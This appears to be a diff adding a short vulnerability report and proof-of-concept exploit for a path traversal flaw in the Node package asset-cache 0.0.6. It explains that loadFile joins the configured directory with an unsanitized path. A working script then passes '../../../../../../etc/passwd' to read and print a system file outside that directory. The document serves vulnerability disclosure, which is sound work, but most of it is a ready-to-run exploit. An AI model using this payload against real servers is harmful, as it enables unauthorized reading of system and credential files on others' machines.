@@ -1,0 +1,25 @@
+Confirmed path traversal via `loadFile`/`handleRequest` in `asset-cache@0.0.6` — `path.join(config.dir, file)` doesn't strip `../` sequences, so a request for a file outside the configured directory succeeds.
+
+```javascript
+// Exploit for path traversal vulnerability in asset-cache 0.0.6
+// lib/asset-cache.js: loadFile() does `path.join(config.dir, file)` with no
+// sanitization of the incoming path, so "../" sequences escape the
+// configured asset directory and let an attacker read arbitrary files.
+
+const assetCache = require("asset-cache");
+
+// Simulate a typical deployment: assets served from a restricted subdir.
+assetCache.setCwd("/tmp/some/public/dir");
+
+// Attacker-controlled "file" (in the real server this comes from req.url).
+const maliciousPath = "../../../../../../etc/passwd";
+
+assetCache.loadFile(maliciousPath, null, function (err, data, notModified, etag) {
+  if (err) {
+    console.error("Unexpected error:", err);
+    process.exit(1);
+  }
+  console.log("Path traversal succeeded! Read file outside configured dir:");
+  console.log(data.toString());
+});
+```
